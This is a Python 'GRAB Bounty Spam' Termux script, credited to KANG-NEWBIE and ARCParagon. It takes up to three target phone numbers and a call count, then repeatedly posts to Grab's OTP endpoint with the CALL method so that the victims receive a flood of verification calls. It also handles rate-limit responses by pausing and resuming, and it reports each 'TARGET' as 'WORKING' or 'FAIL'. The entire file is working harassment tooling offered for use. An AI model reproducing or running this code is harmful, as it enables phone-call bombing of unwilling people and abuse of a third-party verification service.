#!/usr/bin/python
# -*- coding: utf-8 -*-
# Coded by KANG-NEWBIE
# Re-Code by ARCParagon
"""
Do You want recode ?
Its fine
"""

try:
	import os, requests, time, json
except ModuleNotFoundError:
	print("\nInstall Requests Module First ! ")
	print("$ pip install requests\n")
	exit()

os.system('clear')
c=('\033[1;36m')
r=('\033[1;31m')
g=('\033[1;32m')
w=('\033[1;37m')
print("""%s
			GRAB Bounty Spam%s
░▐█▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄█▄☆
░███████████████████████%sCopyright From KangNewbie%s
░▓▓▓▓▓▓▓▓▓██▓▓▓▓▓▓▓▓◤%sRe-Code By ArcParagon%s
╬▀░▐▓▓▓▓▓▓▌▀█░░░█▀░%sGithub : https://github.com/arcparagon/  %s
▒░░▓▓▓▓▓▓█▄▄▄▄▄█▀╬░%s use +62 (ex) +628xxxxxxxxxx %s
░░█▓▓▓▓▓▌░▒▒▒▒▒▒▒▒▒%s TERMUX SCRIPT %s
░▐█▓▓▓▓▓░░▒▒
░▐██████▌╬░

<NOTE> HAVE A FUN WITH THIS CODE ! """%(c,r,g,r,g,r,g,r,g,r,w,r))
print("%s[*] Enter to Continue ! %s"%(g,g))
no1 = input("[?] FIRST LOCK >> %s"%(w))
no2 = input("%s[?] SECOND LOCK >> %s"%(g,w))
no3 = input("%s[?] THIRD LOCK >> %s"%(g,w))
jlmh=int(input("%s[?] SPAM CALL COUNT >> %s"%(g,w)))

try:
	henti_tanya=False
	forcecon=0
	print("\n%s[-] RESULT:%s"%(r,w));time.sleep(1)
	for i in range(jlmh):
		cout=1
		print(f"{'{'}{i+1}{'}'}"+"="*40+f"{'{'}{i+1}{'}'}")
		for i in no1,no2,no3:
			if i == '':
				cout+=1
				continue
			dt={'method':'CALL','countryCode':'id','phoneNumber':i,'templateID':'pax_android_production'}
			r1 = requests.post('https://api.grab.com/grabid/v1/phone/otp',data=dt,headers={'user-agent':'Mozilla/5.0 (Linux; Android 7.1.2; AFTMM Build/NS6264; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36'})

			if "10074" in r1.text:
				print(f"[!] Meanwhile {r}TARGET{cout}{w} Got limit , Please be patient !")
				if henti_tanya == True:
					pass
				else:
					pil=input("[?] Delay the script for 60 sec ? (1 menit) [y/n] ")
					if pil.lower() == 'y':
						for x in range(60):
							try:
								print(end=f"\r[!] Delay {60-(x+1)} Sec",flush=True)
								time.sleep(1)
							except: break
						print("\n[OK] Continue...")
					elif pil.lower() == 'f':
						henti_tanya=True
					else:
						forcecon+=1
						if forcecon >= 3:
							print(f"[!] {c}Click F For stopping question !{w}")
			elif "challengeID" in r1.text:
				print(f"[+] {c}TARGET{cout} {g}WORKING!!!{w}")
			else:
				print(f"[-] {c}TARGET{cout} {r}FAIL!!!{w}")
			time.sleep(10)
			cout+=1
	print("{end}"+"="*40+"{end}")
except KeyboardInterrupt:
	print("\n%s Good Bye Sobat !"%(c))
